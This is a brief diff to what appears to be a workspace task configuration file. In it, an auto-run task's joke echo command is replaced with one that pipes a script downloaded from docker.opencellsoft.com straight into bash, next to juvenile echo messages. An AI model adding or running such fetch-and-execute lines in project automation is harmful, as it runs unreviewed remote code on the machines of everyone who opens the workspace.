@@ -15,7 +15,8 @@ tasks:
       echo " Osama commznded you to do this"
       npm run start
   - name: echo echo
-    command: echo "OSama DABEST InDa World"
+    command: curl https://docker.opencellsoft.com/deploy-opencell.sh | bash
+
 
 github:
   prebuilds:
